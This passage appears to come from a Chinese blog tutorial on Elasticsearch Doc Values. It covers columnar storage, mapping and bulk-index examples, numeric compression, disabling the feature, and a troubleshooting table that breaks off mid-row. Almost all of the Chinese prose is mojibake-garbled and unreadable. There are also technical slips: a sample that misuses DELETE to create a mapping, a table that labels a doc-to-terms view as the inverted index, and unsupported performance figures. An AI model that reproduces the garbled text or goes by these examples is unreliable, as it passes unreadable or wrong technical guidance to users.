<li>ç¤ºä¾‹ï¼šå¯¹å•†å“æŒ‰ä»·æ ¼æ’åºæ—¶ï¼Œåªéœ€é¡ºåºè¯»å–priceåˆ—çš„Doc Values</li>
<li>ä¼˜åŠ¿ï¼šç›¸æ¯”åŠ è½½å®Œæ•´æ–‡æ¡£ï¼Œå¯å‡å°‘90%ä»¥ä¸Šçš„IOæ“ä½œ</li>
</ul>
<p>èšåˆåœºæ™¯ï¼š</p>
<ul>
<li>æ”¯æŒæ“ä½œï¼štermsã€sumã€averageã€percentilesç­‰</li>
<li>å®é™…æ¡ˆä¾‹ï¼šè®¡ç®—æŸæ—¶é—´æ®µå†…è®¢å•é‡‘é¢çš„åˆ†å¸ƒæƒ…å†µ</li>
<li>æ€§èƒ½å¯¹æ¯”ï¼šæ¯”ä½¿ç”¨è„šæœ¬è®¡ç®—å¿«5-10å€</li>
</ul>
<p>è¿‡æ»¤åœºæ™¯ï¼š</p>
<ul>
<li>é€‚ç”¨æ“ä½œï¼šèŒƒå›´è¿‡æ»¤(price&gt;100)ã€ç²¾ç¡®åŒ¹é…(status="active")ç­‰</li>
<li>å®ç°åŸç†ï¼šé€šè¿‡bitmapå¿«é€Ÿç­›é€‰ç¬¦åˆæ¡ä»¶çš„æ–‡æ¡£ID</li>
<li>ç‰¹æ®Šä¼˜åŒ–ï¼šå¯¹æ•°å€¼ç±»å‹æ”¯æŒä½å›¾ç´¢å¼•åŠ é€Ÿ</li>
</ul>
<ol start="4">
<li>å®ç°ç»†èŠ‚ï¼š</li>
</ol>
<ul>
<li>é»˜è®¤å¼€å¯ï¼šåœ¨Elasticsearchç­‰ç³»ç»Ÿä¸­é€šå¸¸é»˜è®¤å¯ç”¨</li>
<li>å­˜å‚¨ä½ç½®ï¼šæ—¢æ”¯æŒå†…å­˜æ˜ å°„ä¹Ÿæ”¯æŒç£ç›˜æŒä¹…åŒ–</li>
<li>æ›´æ–°æœºåˆ¶ï¼šé‡‡ç”¨è¿½åŠ å†™æ–¹å¼ï¼Œå®šæœŸåˆå¹¶ä¼˜åŒ–</li>
</ul>
<ol start="5">
<li>ä½¿ç”¨å»ºè®®ï¼š</li>
</ol>
<ul>
<li>é€‚åˆå­—æ®µï¼šé«˜åŸºæ•°å­—æ®µã€éœ€è¦é¢‘ç¹èšåˆ/æ’åºçš„å­—æ®µ</li>
<li>ä¸é€‚åˆåœºæ™¯ï¼šå¤§æ–‡æœ¬å­—æ®µ(è¶…è¿‡å‡ KB)ã€å¾ˆå°‘è¢«æŸ¥è¯¢çš„å­—æ®µ</li>
<li>é…ç½®å‚æ•°ï¼šå¯é€šè¿‡"doc_values: false"æ˜¾å¼å…³é—­</li>
</ul>
<p>é€šè¿‡åˆç†ä½¿ç”¨Doc Valuesï¼Œå¯ä»¥æ˜¾è‘—æå‡åˆ†æå‹æŸ¥è¯¢çš„æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§æ•°æ®é›†æ—¶æ•ˆæœæ›´ä¸ºæ˜æ˜¾ã€‚</p>
<h3 data-id="heading-3">ä¸ºä»€ä¹ˆè¦æœ‰Doc Values</h3>
<p>Elasticsearchä¹‹æ‰€ä»¥æœç´¢è¿™ä¹ˆè¿…é€Ÿï¼Œå½’åŠŸäºå®ƒçš„å€’æ’ç´¢å¼•è®¾è®¡ï¼Œç„¶åå®ƒä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå€’æ’ç´¢å¼•çš„æ£€ç´¢æ€§èƒ½æ˜¯éå¸¸å¿«çš„ï¼Œä½†æ˜¯åœ¨å­—æ®µæ’åºæ—¶å´ä¸æ˜¯ç†æƒ³çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">Term Doc_1 Doc_2
-------------------------
quick  |   | X
the    | X |
brown  | X | X
dog    | X |
dogs   |   | X
fox    | X |
foxes  |   | X
in     |   | X
jumped | X |
lazy   | X | X
leap   |   | X
over   | X | X
summer |   | X
the    | X |
------------------------
</code></pre>
<p>å¦‚ä¸Šé¢çš„å†…å®¹ä¸­å¯ä»¥çœ‹å‡ºï¼Œå®ƒåªæœ‰è¯å¯¹åº”docï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“æ¯ä¸€ä¸ªdocä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆå¦‚æœæƒ³æ’åºçš„è¯æ¯ä¸€ä¸ªdocéƒ½å»è·å–ä¸€æ¬¡æ–‡æ¡£å†…å®¹å²‚ä¸æ˜¯éå¸¸è€—æ—¶ï¼ŸDocValuesçš„å‡ºç°ä½¿å¾—è¿™ä¸ªé—®é¢˜è¿åˆƒè€Œè§£ã€‚
å­—æ®µçš„ doc_values  å±æ€§æœ‰ä¸¤ä¸ªå€¼ï¼Œtrueã€falseï¼Œé»˜è®¤æ˜¯trueï¼Œå³å¼€å¯ã€‚
å½“ doc_values ä¸º false æ—¶ï¼Œæ— æ³•åŸºäºè¯¥å­—æ®µæ’åºã€èšåˆã€åœ¨è„šæœ¬ä¸­è®¿é—®å­—æ®µå€¼ã€‚
å½“ doc_values ä¸º true æ—¶ï¼ŒESä¼šå¢åŠ ä¸€ä¸ªç›¸åº”çš„æ­£æ’ç´¢å¼•ï¼Œè¿™å¢åŠ çš„ç£ç›˜å ç”¨ï¼Œä¹Ÿä¼šå¯¼è‡´ç´¢å¼•æ•°æ®é€Ÿåº¦æ…¢ä¸€äº›ã€‚</p>
<p>Doc Values æ˜¯åˆ—å¼å­˜å‚¨çš„ï¼Œè¿™æ„å‘³ç€æ¯ä¸ªå­—æ®µå€¼éƒ½ä»¥åˆ—çš„å½¢å¼å­˜å‚¨åœ¨ç£ç›˜ä¸­ï¼Œè€Œä¸æ˜¯åƒåŸå§‹æ–‡æ¡£é‚£æ ·å­˜å‚¨åœ¨è¡Œä¸­ã€‚è¿™ç§æ–¹å¼æœ‰åŠ©äºä¼˜åŒ–æ•°æ®çš„è¯»å–ï¼Œå› ä¸ºåœ¨æ‰§è¡Œæ’åºæˆ–èšåˆæ—¶ï¼ŒElasticsearch åªéœ€è®¿é—®ä¸æ“ä½œç›¸å…³çš„å­—æ®µï¼Œè€Œä¸éœ€è¦åŠ è½½æ•´ä¸ªæ–‡æ¡£ã€‚</p>
<p>æ¯ä¸ªæ–‡æ¡£çš„å­—æ®µå€¼åœ¨ç´¢å¼•æ—¶è¢«é¢„å¤„ç†ï¼Œå¹¶ä»¥å‹ç¼©çš„å½¢å¼å­˜å‚¨ä¸º Doc Valuesï¼Œè¿™äº›å€¼ä¼šä»¥å†…å­˜æ˜ å°„æ–‡ä»¶ï¼ˆmemory-mapped fileï¼‰çš„æ–¹å¼åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä»¥ä¾¿è¿›è¡Œå¿«é€Ÿè¯»å–ã€‚</p>
<h3 data-id="heading-4">Doc Valuesä¸¾ä¾‹</h3>
<p>åˆ›å»ºä¸€ä¸ªç´¢å¼•ï¼š</p>
<pre><code class="hljs language-json" lang="json">PUT /person
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mappings"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"properties"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">"keyword"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"doc_values"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"age"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">"integer"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"doc_values"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å†™å…¥ç›¸å¯¹åº”çš„æ•°æ®ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">POST _bulk
{ "index" : { "_index" : "person", "_id" : "1" } }
{ "name" : "æ˜æ˜", "age": 22 }
{ "index" : { "_index" : "person", "_id" : "2" } }
{ "name" : "ä¸½ä¸½", "age": 18 }
{ "index" : { "_index" : "person", "_id" : "3" } }
{ "name" : "åª›åª›", "age": 19 }
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/899a30a2dff44d42bc5f656bfa0ac0be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398583&amp;x-signature=px%2Fw33VU391G%2BP6KTYTqrdnq%2F4g%3D" alt="Elasticsearch bulk" loading="lazy"/>
è¿›è¡Œå…¨é‡æŸ¥è¯¢ï¼Œç¡®è®¤ä¸€ä¸‹æ•°æ®çš„æƒ…å†µï¼š</p>
<pre><code class="hljs language-json" lang="json">POST /person/_search
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"query"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"match_all"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"sort"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"order"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"desc"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9883592f21b64a8684ecdc24a71802af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398583&amp;x-signature=unvQ8nFMVFbxTdb0UTXnQPEGgsM%3D" alt="Elasticsearch æŸ¥è¯¢" loading="lazy"/></p>
<h3 data-id="heading-5">ä»€ä¹ˆæ˜¯Doc Values</h3>
<p>Doc Values é€šè¿‡è½¬ç½®å€’æ’ç´¢å¼•å’Œæ­£æ’ç´¢å¼•ä¸¤è€…é—´çš„å…³ç³»æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå€’æ’ç´¢å¼•å°†è¯é¡¹æ˜ å°„åˆ°åŒ…å«å®ƒçš„æ–‡æ¡£ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">Doc Terms
-----------------------------------------------------------------
Doc_1 | brown, dog, fox, jumped, lazy, over, quick, the
Doc_2 | brown, dogs, foxes, in, lazy, leap, over, quick, summer
Doc_3 | dog, dogs, fox, jumped, over, quick, the
-----------------------------------------------------------------
</code></pre>
<p>å½“æ•°æ®è¢«è½¬ç½®åï¼Œæƒ³è¦æ”¶é›†åˆ°æ¯ä¸ªæ–‡æ¡£è¡Œï¼Œè·å–æ‰€æœ‰çš„è¯é¡¹å°±éå¸¸ç®€å•äº†ã€‚</p>
<h3 data-id="heading-6">æ·±å…¥ç†è§£ES Doc Values</h3>
<p>DocValuesæ˜¯Luceneç´¢å¼•æœºåˆ¶ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒä¸å€’æ’ç´¢å¼•åŒæ—¶ç”Ÿæˆï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</p>
<ol>
<li>ç”Ÿæˆæœºåˆ¶ï¼š</li>
</ol>
<ul>
<li>åœ¨ç´¢å¼•åˆ›å»ºé˜¶æ®µï¼ŒDocValuesä¼šä¸å€’æ’ç´¢å¼•å¹¶è¡Œæ„å»º</li>
<li>åŸºäºSegmentçº§åˆ«ç”Ÿæˆï¼Œæ¯ä¸ªSegmentéƒ½åŒ…å«è‡ªå·±ç‹¬ç«‹çš„DocValuesæ•°æ®</li>
<li>ç”Ÿæˆåæ˜¯ä¸å¯å˜çš„ï¼Œä¸å€’æ’ç´¢å¼•ä¿æŒä¸€è‡´æ€§</li>
</ul>
<ol start="2">
<li>å­˜å‚¨ç‰¹æ€§ï¼š</li>
</ol>
<ul>
<li>é‡‡ç”¨é«˜æ•ˆçš„åºåˆ—åŒ–æ–¹å¼å°†æ•°æ®ç»“æ„æŒä¹…åŒ–åˆ°ç£ç›˜</li>
<li>å­˜å‚¨æ ¼å¼ç»è¿‡ä¼˜åŒ–ï¼Œæ”¯æŒå¿«é€Ÿéšæœºè®¿é—®å’Œé¡ºåºæ‰«æ</li>
<li>ä¸å€’æ’ç´¢å¼•å…±äº«ç›¸åŒçš„Segmentåˆå¹¶ç­–ç•¥</li>
</ul>
<ol start="3">
<li>å†…å­˜ç®¡ç†ä¼˜åŠ¿ï¼š</li>
</ol>
<ul>
<li>åˆ©ç”¨æ“ä½œç³»ç»Ÿæ–‡ä»¶ç¼“å­˜æœºåˆ¶ï¼Œè€ŒéJVMå †å†…å­˜</li>
<li>å½“æ•°æ®é‡å°äºç³»ç»Ÿå¯ç”¨å†…å­˜æ—¶ï¼ˆworkingset &lt; RAMï¼‰ï¼š
<ul>
<li>æ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨å°†é¢‘ç¹è®¿é—®çš„DocValuesä¿ç•™åœ¨å†…å­˜ä¸­</li>
<li>å®ç°æ¥è¿‘å†…å­˜æ•°æ®åº“çš„è®¿é—®é€Ÿåº¦</li>
<li>å…¸å‹åœºæ™¯ï¼šè¿‡æ»¤ã€æ’åºã€èšåˆç­‰æ“ä½œèƒ½è·å¾—æå¿«å“åº”</li>
</ul>
</li>
</ul>
<ol start="4">
<li>å¤§å®¹é‡å¤„ç†èƒ½åŠ›ï¼š</li>
</ol>
<ul>
<li>å½“æ•°æ®é‡è¶…è¿‡å†…å­˜å®¹é‡æ—¶ï¼ˆworkingset &gt;&gt; RAMï¼‰ï¼š
<ul>
<li>æ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨å°†ä¸æ´»è·ƒæ•°æ®æ¢å‡ºåˆ°ç£ç›˜</li>
<li>è™½ç„¶è®¿é—®é€Ÿåº¦æœ‰æ‰€ä¸‹é™ï¼Œä½†é¿å…äº†OOMé£é™©</li>
<li>å…¸å‹åœºæ™¯ï¼šå¤„ç†æ•°åäº¿æ–‡æ¡£æ—¶ä»èƒ½ä¿æŒç¨³å®šæ€§èƒ½</li>
</ul>
</li>
</ul>
<ol start="5">
<li>åº”ç”¨åœºæ™¯ç¤ºä¾‹ï¼š</li>
</ol>
<ul>
<li>ç”µå•†å¹³å°ä¸­ç™¾ä¸‡çº§å•†å“çš„ä»·æ ¼æ’åº</li>
<li>æ—¥å¿—åˆ†æç³»ç»Ÿä¸­çš„æ—¶é—´èŒƒå›´è¿‡æ»¤</li>
<li>å¤§æ•°æ®åˆ†æä¸­çš„åˆ†ç»„èšåˆè®¡ç®—</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿DocValuesåœ¨ä¿æŒé«˜æ€§èƒ½çš„åŒæ—¶ï¼Œä¹Ÿèƒ½å¤„ç†è¿œè¶…ç‰©ç†å†…å­˜å®¹é‡çš„æ•°æ®é›†ï¼Œä¸ºå¤§è§„æ¨¡æ•°æ®åº”ç”¨æä¾›äº†å¯é çš„åº•å±‚æ”¯æŒã€‚</p>
<h3 data-id="heading-7">DocValues å‹ç¼©</h3>
<p>ä»å¹¿ä¹‰æ¥è¯´ï¼ŒDocValuesæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„åˆ—å¼å­˜å‚¨ï¼Œè¿™ä¸ªç»“æ„éå¸¸é€‚ç”¨äºèšåˆã€æ’åºã€è„šæœ¬ç­‰æ“ä½œã€‚è€Œä¸”ï¼Œè¿™ç§å­˜å‚¨æ–¹å¼éå¸¸çš„ä¾¿äºå‹ç¼©ï¼Œç‰¹åˆ«æ˜¯æ•°å­—ç±»å‹ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ç£ç›˜ç©ºé—´å¹¶ä¸”æé«˜è®¿é—®é€Ÿåº¦ã€‚
ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ç»„æ•°å­—ç±»å‹çš„DocValuesï¼š</p>
<pre><code class="hljs language-shell" lang="shell">Doc Terms
-----------------------------------------------------------------
Doc_1 | 100
Doc_2 | 1000
Doc_3 | 1500
Doc_4 | 1200
Doc_5 | 300
Doc_6 | 1900
Doc_7 | 4200
-----------------------------------------------------------------
</code></pre>
<p>ä½ ä¼šæ³¨æ„åˆ°è¿™é‡Œæ¯ä¸ªæ•°å­—éƒ½æ˜¯100çš„å€æ•°ï¼ŒDocValuesä¼šæ£€æµ‹ä¸€ä¸ªæ®µé‡Œé¢çš„æ‰€æœ‰æ•°å€¼ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªæœ€å¤§å…¬çº¦æ•°ï¼Œæ–¹ä¾¿åšè¿›ä¸€æ­¥çš„æ•°æ®å‹ç¼©ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ¯ä¸ªæ•°å­—éƒ½é™¤ä»¥100ï¼Œç„¶åå¾—åˆ°ï¼š[1,10,15,12,3,19,42]ã€‚ç°åœ¨è¿™äº›æ•°å­—å˜å°äº†ï¼Œåªéœ€è¦å¾ˆå°‘çš„ä½å°±å¯ä»¥å­˜å‚¨ä¸‹ï¼Œä¹Ÿå‡å°‘äº†ç£ç›˜å­˜æ”¾çš„å¤§å°ã€‚</p>
<p>DocValuesåœ¨å‹ç¼©è¿‡ç¨‹ä¸­ä½¿ç”¨å¦‚ä¸‹æŠ€å·§ï¼Œå®ƒä¼šä¾æ¬¡æ£€æµ‹ä»¥ä¸‹å‹ç¼©æ¨¡å¼ï¼š</p>
<ul>
<li>å¦‚æœæ‰€æœ‰çš„æ•°å€¼å„ä¸ç›¸åŒï¼ˆæˆ–ç¼ºå¤±ï¼‰ï¼Œè®¾ç½®ä¸€ä¸ªæ ‡è®°å¹¶è®°å½•è¿™äº›å€¼</li>
<li>å¦‚æœè¿™äº›å€¼å°äº256ï¼Œå°†ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ç¼–ç è¡¨</li>
<li>å¦‚æœè¿™äº›å€¼å¤§äº256ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ä¸€ä¸ªæœ€å¤§å…¬çº¦æ•°</li>
<li>å¦‚æœæ²¡æœ‰å­˜åœ¨æœ€å¤§å…¬çº¦æ•°ï¼Œä»æœ€å°çš„æ•°å€¼å¼€å§‹ï¼Œç»Ÿä¸€è®¡ç®—åç§»é‡è¿›è¡Œç¼–ç 
å½“ç„¶å¦‚æœå­˜å‚¨Stringç±»å‹ï¼Œå…¶ä¸€æ ·å¯ä»¥é€šè¿‡é¡ºåºè¡¨å¯¹Stringç±»å‹è¿›è¡Œæ•°å­—ç¼–ç ï¼Œç„¶åå†æŠŠæ•°å­—ç±»å‹æ„å»ºDocValuesã€‚</li>
</ul>
<h3 data-id="heading-8">ç¦ç”¨ Doc Values</h3>
<p>DocValues é»˜è®¤å¯¹æ‰€æœ‰å­—æ®µå¯åŠ¨ï¼Œé™¤äº† analyzed stringsã€‚ä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰çš„æ•°å­—ã€åœ°ç†åæ ‡ã€æ—¥æœŸã€IPå’Œä¸åˆ†æï¼ˆnot_analyzedï¼‰å­—ç¬¦ç±»å‹éƒ½ä¼šé»˜è®¤å¼€å¯ã€‚
analyzed stringsæš‚æ—¶è¿˜ä¸èƒ½ä½¿ç”¨ DocValuesï¼Œæ˜¯å› ä¸ºç»è¿‡åˆ†æä»¥åå¾—æ–‡æœ¬ä¼šç”Ÿæˆå¤§é‡çš„Tokenï¼Œè¿™æ ·éå¸¸å½±å“æ€§èƒ½ã€‚
è™½ç„¶DocValueséå¸¸å¥½ç”¨ï¼Œä½†æ˜¯å¦‚æœä½ å­˜å‚¨çš„æ•°æ®ç¡®å®ä¸éœ€è¦è¿™ä¸ªç‰¹æ€§ï¼Œå°±ä¸å¦‚ç¦ç”¨å®ƒï¼Œè¿™æ ·ä¸ä»…èŠ‚çœç£ç›˜ç©ºé—´ï¼Œä¹Ÿè®¸ä¼šæå‡ç´¢å¼•çš„é€Ÿåº¦ã€‚
è¦ç¦ç”¨DocValuesï¼Œåœ¨å­—æ®µçš„æ˜ å°„mappingè®¾ç½®doc_valuesï¼šfalseå³å¯ã€‚ä¾‹å¦‚ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç´¢å¼•ï¼Œå­—æ®µ session_idç¦ç”¨äº†DocValuesï¼š</p>
<pre><code class="hljs language-json" lang="json">DELETE /my_index
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mappings"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"keyword"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"doc_values"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>é€šè¿‡è®¾ç½® doc_valuesï¼šfalseï¼Œè¿™ä¸ªå­—æ®µå°†ä¸èƒ½è¢«ç”¨äºèšåˆã€æ’åºä»¥åŠè„šæœ¬æ“ä½œ</p>
<h3 data-id="heading-9">å¸¦æ¥çš„ä¼˜åŠ¿</h3>
<ul>
<li>å‡å°‘å†…å­˜ä½¿ç”¨ï¼šç”±äº Doc Values å°†å­—æ®µå€¼å­˜å‚¨åœ¨ç£ç›˜ä¸Šå¹¶åœ¨éœ€è¦æ—¶è¯»å–ï¼Œå› æ­¤ç›¸æ¯”å†…å­˜ä¸­ä¿æŒå­—æ®µå€¼çš„æ–¹å¼ï¼ˆä¾‹å¦‚ fielddataï¼‰ï¼Œå®ƒæå¤§åœ°å‡å°‘äº†å†…å­˜çš„ä½¿ç”¨ã€‚</li>
<li>é«˜æ•ˆçš„ç£ç›˜è¯»å–ï¼šDoc Values çš„åˆ—å¼å­˜å‚¨æ„å‘³ç€åœ¨æ‰§è¡Œæ’åºæˆ–èšåˆæ“ä½œæ—¶ï¼ŒElasticsearch å¯ä»¥åªåŠ è½½æ‰€éœ€çš„å­—æ®µå€¼ï¼Œè€Œä¸å¿…åŠ è½½æ•´ä¸ªæ–‡æ¡£ã€‚</li>
<li>æé«˜æ’åºå’Œèšåˆçš„æ€§èƒ½ï¼šå¯¹äºç»å¸¸éœ€è¦æ’åºæˆ–èšåˆçš„å­—æ®µï¼ŒDoc Values å¯ä»¥æ˜¾è‘—æé«˜æ€§èƒ½ï¼Œå› ä¸ºå®ƒä¼˜åŒ–äº†è¯»å–è·¯å¾„ã€‚</li>
</ul>
<h3 data-id="heading-10">ä½¿ç”¨åœºæ™¯</h3>
<ul>
<li>æ’åºï¼šä¾‹å¦‚ï¼Œç”¨æˆ·éœ€è¦æ ¹æ®æ—¶é—´æˆ³æ’åºæŸ¥è¯¢ç»“æœï¼ŒDoc Values ä¼šæä¾›ä¼˜åŒ–çš„åˆ—å¼å­˜å‚¨ï¼Œç›´æ¥ä»ç£ç›˜è¯»å–æ—¶é—´æˆ³çš„å€¼è¿›è¡Œæ’åºï¼Œè€Œä¸éœ€è¦åŠ è½½æ•´ä¸ªæ–‡æ¡£ã€‚</li>
<li>èšåˆï¼šåœ¨æ‰§è¡Œä¾‹å¦‚ç»Ÿè®¡æŸä¸ªå­—æ®µçš„å¹³å‡å€¼ã€æœ€å¤§å€¼æˆ–åˆ†å¸ƒæƒ…å†µæ—¶ï¼ŒDoc Values å¯ä»¥æå¤§åœ°æé«˜æŸ¥è¯¢çš„å“åº”é€Ÿåº¦ï¼Œå› ä¸ºåªéœ€è¯»å–ç›¸å…³å­—æ®µå³å¯ã€‚</li>
<li>èŒƒå›´æŸ¥è¯¢ï¼šä¾‹å¦‚æŸ¥æ‰¾ä»·æ ¼åœ¨ä¸€å®šèŒƒå›´å†…çš„æ–‡æ¡£æ—¶ï¼ŒDoc Values å…è®¸å¿«é€Ÿæ‰«æä»·æ ¼å­—æ®µè€Œä¸æ¶‰åŠæ–‡æ¡£çš„å…¶ä»–å†…å®¹ã€‚</li>
</ul>
<h2 data-id="heading-11">é”™è¯¯é€ŸæŸ¥</h2>















































<table><thead><tr><th>ç—‡çŠ¶</th><th>æ ¹å› </th><th>å®šä½</th><th>ä¿®å¤</th></tr></thead><tbody><tr><td><code>sort/terms agg</code> æŠ¥ï¼š<code>Fielddata is disabled on text fields</code></td><td>åœ¨ <code>text</code> å­—æ®µä¸Šåšèšåˆ/æ’åºï¼›<code>text</code> é»˜è®¤æ—  <code>doc values</code></td><td><code>GET index/_mapping</code> çœ‹å­—æ®µç±»å‹æ˜¯å¦ä¸º <code>text</code>ï¼Œæ˜¯å¦å­˜åœ¨ <code>xxx.keyword</code></td><td>æŸ¥è¯¢æ”¹ç”¨ <code>xxx.keyword</code>ï¼›æˆ–æ˜¾å¼ <code>fielddata=true</code>ï¼ˆè¯„ä¼°å †å†…å­˜ä¸çƒ­åº¦ï¼‰ï¼›é•¿æœŸæ–¹æ¡ˆï¼šå»ºæ–°ç´¢å¼•ç”¨ <code>text + keyword</code> å¤šå­—æ®µ</td></tr><tr><td>æŒ‰å­—æ®µæ’åº/èšåˆå¤±è´¥ï¼Œæç¤ºè¯¥å­—æ®µä¸æ”¯æŒ <code>doc values</code></td><td>å­—æ®µç±»å‹ä¸æ”¯æŒæˆ–è¢«è®¾ç½® <code>doc_values:false</code></td><td><code>mapping</code> ä¸­æŸ¥ <code>doc_values</code> ä¸å­—æ®µç±»å‹</td><td>å¯¹éœ€è¦æ’åº/èšåˆ/è„šæœ¬çš„å­—æ®µä¿æŒ <code>doc_values:true</code>ï¼ˆå¯çœç•¥é»˜è®¤ï¼‰ï¼›å¯¹ä¸éœ€è¦åˆ†æèƒ½åŠ›çš„å­—ç¬¦ä¸²ç”¨ <code>keyword</code></td></tr><tr><td><code>PUT mapping</code> åå‘ç°â€œæ²¡ç”Ÿæ•ˆ/æ”¹ä¸æ‰/åˆ ä¸æ‰å­—æ®µâ€</td><td>ES <code>mapping</code> ä¸èƒ½æ›¿æ¢æˆ–ç§»é™¤æ—¢æœ‰å­—æ®µå®šä¹‰</td><td>çœ‹ <code>PUT _mapping</code> è¿”å›ä¸å®é™… <code>mapping</code> å¯¹æ¯”ï¼›æ£€æŸ¥æ˜¯å¦è¯•å›¾ä¿®æ”¹å·²æœ‰å­—æ®µå‚æ•°</td><td>èµ°â€œæ–°å»ºç´¢å¼• + æ­£ç¡® <code>mapping</code> + <code>reindex</code> + åˆ‡åˆ«åâ€çš„è¿ç§»è·¯å¾„ï¼›ä¸è¦æœŸå¾…åœ¨çº¿è¦†ç›–å¼æ”¹ <code>mapping</code></td></tr><tr><td>ç…§æŠ„ç¤ºä¾‹ç”¨ <code>DELETE /index</code> æºå¸¦ <code>body</code> è®¾ç½® <code>mapping</code>ï¼Œæ‰§è¡ŒæŠ¥é”™</td><td><code>DELETE</code> ç”¨äºåˆ ç´¢å¼•ï¼Œä¸æ˜¯å»º <code>mapping</code>ï¼›ç¤ºä¾‹è¯·æ±‚æ–¹æ³•ä¸åŒ¹é…</td><td>å›çœ‹è¯·æ±‚æ–¹æ³•ä¸ APIï¼šæ˜¯å¦æŠŠå»ºç´¢å¼•/å»º <code>mapping</code> å†™æˆ <code>DELETE</code></td><td>åˆ›å»ºç´¢å¼•ç”¨ <code>PUT /index {mappings...}</code>ï¼›æ›´æ–° <code>mapping</code> ç”¨ <code>PUT /index/_mapping {properties...}</code>ï¼ˆä½†ä¸ä¿è¯å¯æ”¹å·²æœ‰å­—æ®µï¼‰</td></tr><tr><td><code>doc_values</code> å…³é—­åï¼Œç£ç›˜çœäº†ä½†æŸ¥è¯¢/è„šæœ¬åŠŸèƒ½ç¼ºå¤±</td><td>å…³é—­ <code>doc values</code> ä¼šç›´æ¥ä¸¢å¤±æ’åº/èšåˆ/è„šæœ¬å–å€¼èƒ½åŠ›</td><td><code>mapping</code> æ£€æŸ¥ <code>doc_values:false</code>ï¼›å¤ç°ï¼š<code>sort/agg/script</code> 